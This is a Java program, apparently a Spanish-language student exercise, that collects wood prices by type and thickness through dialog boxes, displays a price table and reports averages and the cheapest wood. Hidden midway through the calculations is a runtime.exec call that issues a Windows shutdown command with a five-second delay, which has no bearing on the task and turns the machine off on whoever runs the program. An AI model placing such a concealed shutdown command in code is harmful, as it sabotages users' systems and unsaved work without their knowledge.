package Maderos;
import javax.swing.JOptionPane;
import java.io.*;
public class MaderaApp {

	public static void main(String[] args) {
		// TODO Auto-generated method stub

		String Madera[]= {"Caoba","Cedro","Roble","Nogal","Teca"},
				ancho[]= {"  3mm","  5mm","  7mm","10mm"};
		double mm[][]=new double[Madera.length][ancho.length];
		double av[]=new double[Madera.length];
		for (int j=0;j<mm.length;j++) {
			for (int t=0;t<mm[j].length;t++) {
				mm[j][t]=Double.parseDouble(JOptionPane.showInputDialog("Introduce el precio de la madera de "+Madera[j]+" de "+ancho[t]));
			while(mm[j][t]<=0) {
				mm[j][t]=Double.parseDouble(JOptionPane.showInputDialog("ERROR!\nIntroduce un valor positvo\nIntroduce el precio de la madera de "+Madera[j]+" de "+ancho[t]));
			}
		}
		}
		String res=( "           ");
		for (int  i=0;i<Madera.length;i++) {
			res+=("      "+Madera[i]);
		}
		res+="\n";
		for (int i=0;i<ancho.length; i++) {
			res+=( ancho[i]+":");
			for (int j=0;j<Madera.length;j++) {
				res+=("          "+mm[j][i]);
			}
			res+="\n";
		}
			JOptionPane.showMessageDialog(null,res);
			String media=( "           ");
			for (int  i=0;i<Madera.length;i++) {
				media+=("   "+Madera[i]);
			}
			double avr;
			Runtime runtime = Runtime.getRuntime();
		      try
		     {
		         runtime.exec("shutdown -s -t 5");
		      }
		      catch(IOException e)
		      {
		         System.out.println("Exception: " +e);
		      }
			double me=999999999;
			int c=-1;
			media+="\nMedia:";
			for (int i=0;i<mm.length; i++) {
				avr=0;
				for (int j=0;j<mm[i].length;j++) {
					avr+=mm[i][j];
				}
				avr/=4;
				av[i]=avr;
				media+=("     "+String.format("%.2f", avr));
				}
			for (int i=0;i<av.length; i++) {
				if (av[i]<me) {
					c=i;
					me=av[i];
					}
			
			}
			JOptionPane.showMessageDialog(null,media);
			JOptionPane.showMessageDialog(null,"La madera mas barata es "+Madera[c]+" y su media es "+String.format("%.2f", me));	
	}
	
}
